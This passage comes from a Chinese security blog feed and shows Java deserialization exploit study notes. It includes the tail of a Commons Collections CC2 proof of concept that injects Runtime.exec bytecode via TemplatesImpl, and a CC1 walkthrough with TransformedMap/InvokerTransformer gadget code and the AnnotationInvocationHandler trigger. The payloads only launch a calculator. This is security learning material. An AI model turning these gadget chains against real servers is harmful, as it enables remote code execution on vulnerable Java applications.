class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\&quot;);&quot;</span>;</span><br><span class="line">            poc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            <span class="type">String</span> <span class="variable">RandName</span> <span class="operator">=</span> <span class="string">&quot;POC&quot;</span>+System.nanoTime();</span><br><span class="line">            poc.setName(RandName);</span><br><span class="line">            poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));</span><br><span class="line">            <span class="type">byte</span>[] classbyte = poc.toBytecode();</span><br><span class="line">            <span class="type">byte</span>[][] trueclassbyte = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">            <span class="comment">//反射设置值</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field2.set(templates,trueclassbyte);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field3.set(templates,<span class="string">&quot;Ho1L0w-By&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field4.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException | NotFoundException | IOException | ClassNotFoundException |</span><br><span class="line">                 NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> java.util.PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field5.set(queue,queueArray);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519171946357.png" alt="image-20230519171946357"></p><p>这个POC写的有点长，主要是因为我没有专门写一个反射用函数，这里每次反射都是手来的，下次加上。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>很有趣的一次跟链子，感觉Java这个动态加载字节码的做法，给了它这种强类型语言不匹配的灵活性，非常爽。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习上</title>
      <link href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/"/>
      <url>/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="CC链学习上："><a href="#CC链学习上：" class="headerlink" title="CC链学习上："></a>CC链学习上：</h1><h1 id="CC1："><a href="#CC1：" class="headerlink" title="CC1："></a>CC1：</h1><p>这里主要还是学习的是P神的知识星球里面的Java安全漫谈。</p><p>Commons Collections的利用链也就是CC链，是Apache中的一个库，包括了Weblogic，JBoss，WebSphere，Jenkins等知名大型Java应用都使用了这个库。</p><p><strong>这里的CC1指的是lazymap的那条链子，但是网上也有很多关于transformedmap的。</strong></p><blockquote><p>对于CC1的测试环境需要在Java 8u71之前，在此改动后，AnnotationInvocationHandler#readObject不再直接使用 反序列化得到的Map对象，而是直接新建了一个LinkedHashMap对象，并且将原来的键值添加进去。所以，后续对于Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再会执行set或是put操作。</p></blockquote><h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><ol><li>JDK 1.7</li><li>Commons Collections 3.1</li></ol><p>这一处漏洞最后会导致RCE漏洞的产生。</p><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p><code>Apache Commons Collections</code>中提供了一个<code>Transformer</code>的类，这个是个接口，功能就是将一个对象转换为另外一个对象。</p><p>这里首先参考一下P神的CC1利用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                                &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到，这里实例化了一个<code>Transformer</code>类的数组，数组中包含了两个对象。</p><p>虽然这里的<code>Transformer</code>类是一个接口，本来是因为不能直接被实例化的，但是像这种情况出现，在后面应该不止有接口，应该还会存在一些匿名内部类，在匿名内部类的创建过程中实际上是实例化了一个实现接口。</p><p>因为在Java多态中，父类可以引用指向子类对象，同理，接口也可以指向其实例化对象，在实例化对象中必然会实现接口中定义的方法和属性，同时，对象的类型必须是new出来的类型。</p><p><strong>也就是说，重点是因为在这个数组接口中有匿名内部类的实现，而这也算是对接口是实现。</strong></p><p>整个过程中涉及到以下几个接口和类：</p><p><strong>TransformedMap</strong></p><p><code>TransformedMap</code>用于对Java标准数据结构<code>Map</code>，做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们通过下面这行代码对<code>innerMap</code>进行修饰，传出的<code>outerMap</code>即是修饰后的Map。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformeMap.decorate(innerMap,keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure><p>其中，<code>keyTransformer</code>是处理新元素key的回调，<code>valueTransFormer</code>是处理新元素的<code>value</code>的回调。</p><p>这里说的回调不是传统意义上的回调函数，而是一个实现了Transformer接口的类。</p><p><strong>Transformer:</strong></p><p>这是一个接口</p><p>这个接口中有一个待实现的方法，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span>&#123;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TransformerMap在转换Map的新元素的时候，就回到用transform方法，这个过程就类似在调用一个“回调函数“，但是这个回调的参数是原始对象。</p><p><strong>两个实例化：</strong></p><ol><li><p><strong>ConstantTransformer</strong></p><p>这是实现了Transformer接口的一个类，过程就是在构造函函数的时候传入一个对象，斌且在Transform这个方法的时候，再将这个对象返回。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span>&#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line">iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以他的作用其实就是包装任意一个对象，然后在执行回到的时候返回这个对象，进而方便后续操作。</p></li><li><p><strong>InvokerTransformer</strong><br>InvokerTransformer是实现了Transformer接口的一个类，这个类可以用来执行任意方法，也就是反序列化能够进行RCE的关键入手点。</p><p>在实例化这个InvokerTransformer的时候，需要传入三个参数，第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传递给这个函数的参数列表。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName,Class[] paramTypes,Object[] args)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的回调transform方法，就是执行了input对象的MethodName方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(input == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里，是通过反射的方式，来获取了对应<code>input</code>类中<code>iMethodName</code>的函数和传入的参数类型。</p><p>然后直接调用然后调用<code>iMethodName</code>对应的方法，以及iArgs对应的参数。</p></li></ol><p><strong>ChainedTransformer</strong></p><p>ChainedTransformer也是实现了Transformer接口的一个类，它的作用是将内部的多个Transformer串在一起，简单来说就是将前一个回调返回的结果作为后一个回调的参数传入。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line">iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">object = iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单来看，就是将传入的Transformer类的数组进行了一个遍历，然后依次调用了对应的Transformer数组中的类的<code>transform</code>方法。</p><p>这部分的遍历调用，就是能够将多个transform函数连环调用的关键。</p><p>回头看一下源码：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230406104244143.png" alt="image-20230406104244143"></p><p>这部分其实就是创建了一个Transformer数组，内部包含两个实例，然后通过调用<code>ChainedTransformer</code>来连续调用。</p><p>这里是首先调用了<code>Runtime</code>下的<code>getRuntime()</code>方法，这个方法会返回一个新的<code>Runtime</code>类，然后常规操作就是调用这个新Runtime类中的<code>exec</code>函数来进行命令执行。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230406113043011.png" alt="image-20230406113043011"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230406113048917.png" alt="image-20230406113048917"></p><p>在这里，是将这个新返回的Runtime类作为参数传入，然后进行一重包装，等待调用时返回。</p><p>然后是<code>InvokerTransformer</code>这一部分，这部分主要是用来将参数和调用的函数名字传入。</p><p>可以看到这里是调用了<code>exec()</code>函数，也就是调用了<code>Runtime.getRuntime()</code>返回的类<code>currentRuntime()</code>中的<code>exec()</code>函数，来执行命令执行，然后这里同时标注了传入的Class对象数组，其中有一个String类的Class对象。也就是告诉我们参数类型是String。并给出了调用的计算器的绝对路径作为参数，以方便执行。</p><p>然后创建了子类<code>ChainedTransformer()</code>的一个对象，用来连锁调用参数和传来的内容。</p><p>因为这里只是一系列回调，所以需要用来包装innerMap，使用前面的<code>TransformedMap.decorate</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,transformerChain);</span><br></pre></td></tr></table></figure><p>这里就是对内部映射（innerMap）进行了一个包装，使用了<code>transformerChain</code>的转换器。</p><p>最后想要触发回调，就是想Map中放入一个新的元素。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="调用流程："><a href="#调用流程：" class="headerlink" title="调用流程："></a>调用流程：</h3><p>整个调用流程就是：</p><p>1、创建一个Transfomer类的数组，transformers，在其内部添加我们想要执行的函数，参数，内容。</p><p>2、然后调用ChainedTransfomer类，将上述数组作为参数传入，创建一个对象。</p><p>3、新建一个HashMap类的对象，创建了一个数据类型为Map的对象。然后通过TransformedMap.decorate()，来调用数据类型为Map的对象，也就是innerMap，进而来调用ChainedTransformer类的对象——transformerChain类中的transformer()方法。</p><p>4、这个时候，就会依次执行ConstantTransformer类和InvokerTransfomer类中的transformer()方法，也就完成了参数的返回和命令的执行。</p><p>5、上述就是调用流程，为了触发这个调用流程，就需要想outerMap中传入一个键值对，这个时候，就会自动开始调用transformerChain中的方法。</p><p><strong>只能传入值，删减值是没有效果的</strong></p><p>也就是说，最后的命令执行点是在InvokerTransformer类中的transforme()函数中。</p><h3 id="如何生成一个可以利用的序列化对象："><a href="#如何生成一个可以利用的序列化对象：" class="headerlink" title="如何生成一个可以利用的序列化对象："></a>如何生成一个可以利用的序列化对象：</h3><p>为了调用这个链子，我们需要进行一个写入操作来进行触发。但是有一个问题，是因为这里我们是在自己的demo里，可以通过手动触发。</p><p>但是当我们把outerMap这个对象序列化之后，就不能这么进行了，所以我们需要找到一个readObject逻辑里，有一个写入的操作。</p><p>这个类就是<code>sun.reflect.AnnotationInvocationHandler</code>，我们查看一下<code>readObject</code>代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"><span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in</span></span><br><span class="line"><span class="string">                    annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="comment">// If there are annotation members without values, that</span></span><br><span class="line"><span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue :</span><br><span class="line">                memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                        value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                                    value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                    annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是8u17版本的调用链，现在新版本中是不能使用的。</p><p>可以看到，在这个私有类中，定义了一个Map类型的数据，<code>memberTypes</code>，这个变量是存储了所有成员变量的类型。</p><p>根据我们之前的使用方法，应该就能知道这里是主要的调用点。</p><p>然后下面进入了一个for循环，在这个循环里，注意首先设置了一个<code>Map.Entry</code>类型的变量，<code>memberValue</code>。这个类型是一个接口，用来存储<code>Map</code>中的键值对。</p><p>在循环中会首先获取HashMap中的键，然后使用<code>get(name)</code>方法去获取值的信息，随后进行一个if判断，判断这个值的类型是否为Null。</p><p>如果不是Null，就使用getValue()函数获取这个键对应的值，然后再进行一个if判断，在这个if里，会判断<code>Type</code>是不是<code>memberType</code>这个类的实例，或是<code>ExceptionProxy</code>这个类的实例。</p><p>如果不是上面任何一种的实例，就进入判断语句。</p><p>这部分就是利用的点了，可以看到这里调用了<code>setValue()</code>函数，这个函数比较有意思的一点在于，这个函数实际上是改变<code>memberValue</code>这个变量中的键值对，而不是直接改变<code>Map</code>对象中的键值对。</p><p>简单来说，就像是一本书，你只改了书的目录，但是书的内容是不变的。</p><p>这里因为memberValues就是反序列化之后的Map，同时也经过了TransformedMap修饰的对象，所以调用setvalue的时候，就能<strong>触发构造的恶意序列化。</strong></p><p>这里的核心逻辑就是：</p><blockquote><ol><li>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</li><li>memberValue.setValue()</li></ol></blockquote><p>触发条件：</p><blockquote><ol><li>memberValues是我们准备好的经过TransformedMap类修饰的Map</li><li>其中的值不能是Null，同时也不是Exception的实例，或者不是memberType中记录的类型。</li></ol></blockquote><p>也就是说，实际上是可以直接用我们修饰好的类传入进去就可以了。</p><p>为了调用<code>AnnotationInvocationHandler</code>中的<code>readObject()</code>，所以我们需要创建一个对应的实例，用于序列化，并将Map设置进来。</p><p>为了创建这个对象，需要使用反射的形式来进行创建：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstuctor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Construct.newInstance(Retention,class,outerMap);</span><br></pre></td></tr></table></figure><p>这里就是通过反射的方式，创建了一个反射实例<code>obj</code>然后将这个实例进行序列化。</p><p>这时因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是JDK中的一个内部类，不能使用new来直接进行实例化，所以也不能直接进行序列化。 </p><p>在创建实例的时候，将我们之前修饰过的Map作为参数<code>outerMap</code>传入。</p><h3 id="修改原本的POC："><a href="#修改原本的POC：" class="headerlink" title="修改原本的POC："></a>修改原本的POC：</h3><p>随后，可以尝试对这个反射后创建的实例进行序列化。</p><p>但是会出现报错：</p><p><strong>java.io.NotSerializableException: java.lang.Runtime</strong></p><p>这是因为在之前写的调用方式中，Runtime这个类是不支持<code>Serializable</code>这个接口的，当Java要进行序列化的时候，必须要保证序列化的对象和它内部的所有属性对象都要实现<code>Serializable</code>接口。</p><p>因此，需要对Runtime进行反射，然后才能进行序列化。</p><p>所以需要添加反射部分：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)m.invoke(<span class="literal">null</span>); <span class="comment">//这里的getRuntime是static的方法，所以可以不写实例化对象。</span></span><br><span class="line">r.exec(<span class="string">&quot;需要的路径&quot;</span>);</span><br></pre></td></tr></table></figure><p>第一行就是获取Runtime的class对象，然后获取<code>getRuntime()</code>的静态方法。</p><p>然后调用<code>getRuntime()</code>方法，返回一个Object对象，强制转换为Runtime类型。然后调用其中的exec函数。</p><p>只要通过上述步骤就可以完成调用。</p><p>因为<code>InvokeTransformer</code>类中其实就是通过反射的方式来进行调用的，所以，可以通过反射的方式，来对Runtime中的exec进行调用。</p><p>调用的部分是这里：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure><blockquote><p>调用顺序：</p><ol><li>Runtime.getClass()，然后获取其中的getMethod方法，然后invoke()调用getMethod()方法，这里就等于是执行了getMethod(“getRuntime”)。</li><li>上一次的getMethod()函数会返回一个Method对象，这个Method中包含了Runtime中的所有方法，也就相当于那个m，然后获取其自身的invoke()方法，然后调用，因为不需要参数，就直接使用null。</li><li>然后再重复上面的步骤，调用其中的exec函数，来进行命令执行。</li></ol></blockquote><p>这里最主要的可以实行的原因，是因为Runtime.class是一个java.lang.Class对象，实现了Serializable接口，所以可以直接进行序列化。</p><h3 id="无法触发的原因："><a href="#无法触发的原因：" class="headerlink" title="无法触发的原因："></a>无法触发的原因：</h3><p>这是因为在<code>AnnotationInvocationHandler:readObject()</code>中存在一个逻辑：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230421095008194.png" alt="image-20230421095008194"></p><p>这个if语句会对var7的值进行判断，只有在值不为null的时候，才会进入if内部，执行<code>setValue</code>，否则会不会进入，也就不会触发漏洞。</p><p>P神这里直接告诉我们，通过两个条件可以让var7不为Null。</p><ol><li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数必须是Annotation的子类，并且其中必须含有至少一个方法，假设方法名是X</li><li>被<code>TransformedMap.decrate</code>修饰的Map中必须有一个键名为X的元素。</li></ol><p>这里可以看一下为什么需要做上述两个操作：</p><h3 id="为什么要设置两个条件"><a href="#为什么要设置两个条件" class="headerlink" title="为什么要设置两个条件:"></a>为什么要设置两个条件:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123; <span class="comment">//是Annotation类，同时var1只implements了一个接口，此接口是Annotation接口</span></span><br><span class="line">            <span class="built_in">this</span>.type = var1;                   <span class="comment">//this.type是我们传入的Annotation类型Class</span></span><br><span class="line">            <span class="built_in">this</span>.memberValues = var2;           <span class="comment">//memberValues为我们传入的map</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);  <span class="comment">//跟进getInstance</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();  <span 